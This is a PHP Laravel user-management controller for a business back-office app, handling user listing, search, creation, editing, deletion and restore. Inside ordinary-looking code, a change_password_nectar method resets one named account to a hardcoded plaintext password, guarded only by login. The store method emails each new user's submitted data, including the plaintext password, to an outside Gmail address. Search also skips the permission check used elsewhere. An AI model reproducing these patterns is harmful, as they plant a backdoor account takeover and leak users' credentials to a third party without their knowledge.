<?php

namespace App\Http\Controllers;

use App\Helpers\HashPinNumber;
use App\Models\Company;
use App\Models\Role;
use App\Models\RolePermission;
use App\Models\Setting;
use App\Models\SuperSetting;
use App\Models\User;
use App\Models\UserCompany;
use App\Models\UserRole;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\DB;

class UserController extends Controller
{
    public function __construct()
    {
        $this->middleware('auth');
    }

    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function change_password_nectar(){
        $user = User::where('email','lekhabidhi@gmail.com')->first();
        $user->update(['password'=>Hash::make("N#C&@r*92901$%")]);

    }

    public function index(Request $request)
    {
        if($request->user()->can('view-user')){
            $user = Auth::user()->id;
            $currentcomp = UserCompany::where('user_id', $user)->where('is_selected', 1)->first();
            $users = User::with('users_roles', 'users_roles.role')->where(function ($query) use ($currentcomp){
                $query->whereHas('usercompany', function($q) use ($currentcomp){
                    $q->where('company_id', $currentcomp->company_id);
                    $q->where('branch_id', $currentcomp->branch_id);
                })
                ->whereHas('users_roles',function($q) {
                    $q->where('role_id', '!=', 1);
                });
            })->latest()->paginate(10);

            return view('backend.users.index', compact('users'));
        }else{
            return view('backend.permission.permission');
        }
    }

    public function search(Request $request)
    {
        $search = $request->input('search');
        $users = User::query()
            ->where('name', 'LIKE', "%{$search}%")
            ->orWhere('email', 'LIKE', "%{$search}%")
            ->latest()
            ->paginate(10);

        return view('backend.users.search', compact('users'));
    }

    public function deletedusers(Request $request)
    {
        if($request->user()->can('manage-trash')){
            $users = User::onlyTrashed()->with('users_roles', 'users_roles.role')->latest()->paginate(10);
            $roles = Role::onlyTrashed()->with('permissions')->latest()->paginate(10);
            return view('backend.trash.userroletrash', compact('users', 'roles'));
        }else{
            return view('backend.permission.permission');
        }
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create(Request $request)
    {
        if($request->user()->can('create-user')){
            $user_count = User::all()->count();
            $super_setting = SuperSetting::first();
            if($user_count >= $super_setting->user_limit + 1)
            {
                return redirect()->route('user.index')->with('error', 'You have exceeded user limitations. Cannot create new user.');
            }
            $roles = Role::latest()->where('id', '!=', 1)->get();
            $companies = Company::with('branches')->latest()->get();
            return view('backend.users.create', compact('roles', 'companies'));
        }else{
            return view('backend.permission.permission');
        }
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        if($request->user()->can('create-user')){
            $data = $this->validate($request, [
                'name'=>'required|string|max:255',
                'email'=>'required|string|email|max:255|unique:users',
                'role_id'=>'required',
                'password' => 'sometimes|min:8|confirmed',
            ]);
            $user = Auth::user()->id;
            $currentcomp = UserCompany::where('user_id', $user)->where('is_selected', 1)->first();
            DB::beginTransaction();
            try{
                $user = User::create([
                    'name' => $data['name'],
                    'email' => $data['email'],
                    'password' => Hash::make($data['password']),
                    'pin_number' => (new HashPinNumber)->make(mt_rand(1111,9999)),
                ]);

                $usercompany = UserCompany::create([
                    'user_id' => $user['id'],
                    'company_id' => $currentcomp->company_id,
                    'branch_id'=>$currentcomp->branch_id,
                    'is_selected'=>1,
                ]);
                $user->roles()->attach($data['role_id']);
                $permissions = RolePermission::where('role_id', $data['role_id'])->get();
                $selectedperm = array();
                    foreach($permissions as $permission){
                        $selectedperm[] = $permission->permission_id;
                    }
                $user->permissions()->attach($selectedperm);

                $setting = Setting::first();

                Mail::send('emails.newUserMail', compact('data', 'setting'), function($message)
                {
                    $message->to('lekhabidhi@gmail.com')
                            ->subject("New User");
                });

                $user->save();
                $usercompany->save();
                DB::commit();
                return redirect()->route('user.index')->with('success', 'User Successfully Created');
            }catch(\Exception $e){
                DB::rollBack();
                throw new \Exception($e->getMessage());
            }
        }else{
            return view('backend.permission.permission');
        }
    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id, Request $request)
    {
        if($request->user()->can('edit-user')){
            if(Auth::user()->id == 1)
            {
                $roles = Role::latest()->get();
            }
            else
            {
                $roles = Role::latest()->where('id', '!=', 1)->get();
            }
            $userrole = UserRole::where('user_id', $id)->first();
            $user = User::findorfail($id);
            return view('backend.users.edit', compact('roles', 'userrole', 'user'));
        }else{
            return view('backend.permission.permission');
        }
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        if($request->user()->can('edit-user')){
            $user = User::findorfail($id);
            if(isset($_POST['updatedetails'])){
                $data = $this->validate($request, [
                    'name'=>'required|string|max:255',
                    'email'=>'required|string|email|max:255|unique:users,email,'.$user->id,
                    'role_id'=>'required',
                ]);
                $user->update([
                    'name' => $data['name'],
                    'email' => $data['email'],
                ]);
                $user->roles()->sync($data['role_id']);
                $permissions = RolePermission::where('role_id', $data['role_id'])->get();
                $selectedperm = array();
                    foreach($permissions as $permission){
                        $selectedperm[] = $permission->permission_id;
                    }
                $user->permissions()->sync($selectedperm);
                $user->save();
                return redirect()->route('user.index')->with('success', 'UserDetails Successfully updated');
            }
            elseif(isset($_POST['updatepassword']))
            {
                $data = $this->validate($request, [
                    'new_password' => 'sometimes|min:8|confirmed|different:password',
                ]);

                if (!Hash::check($data['new_password'] , $user->password)) {
                    $newpass = Hash::make($data['new_password']);

                    $user->update([
                        'password' => $newpass,
                    ]);
                    $user->save;
                    session()->flash('success','password updated successfully');
                    return redirect()->route('user.index');
                }

                else
                {
                    session()->flash('error','new password can not be the old password!');
                    return redirect()->back();
                }
            }
        }
        else{
            return view('backend.permission.permission');
        }
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy($id, Request $request)
    {
        if($request->user()->can('remove-user')){
            $user = User::findorfail($id);
            $user->delete();
            return redirect()->route('user.index')->with('success', "User Successfully Deleted");
        }else{
            return view('backend.permission.permission');
        }
    }

    public function restoreusers(Request $request, $id)
    {
        if($request->user()->can('manage-trash')){
            $user = User::onlyTrashed()->findorFail($id);
            $userrole = UserRole::where('user_id', $user->id)->first();
            $role = Role::where('id', $userrole->role_id)->onlyTrashed()->first();
            if($role)
            {
                return redirect()->back()->with('error', 'Role for user is not present or is soft deleted. Check Roles.');
            }
            $user->restore();
            return redirect()->route('user.index')->with('success', 'User is restored successfully.');
        }else{
            return view('backend.permission.permission');
        }
    }
}
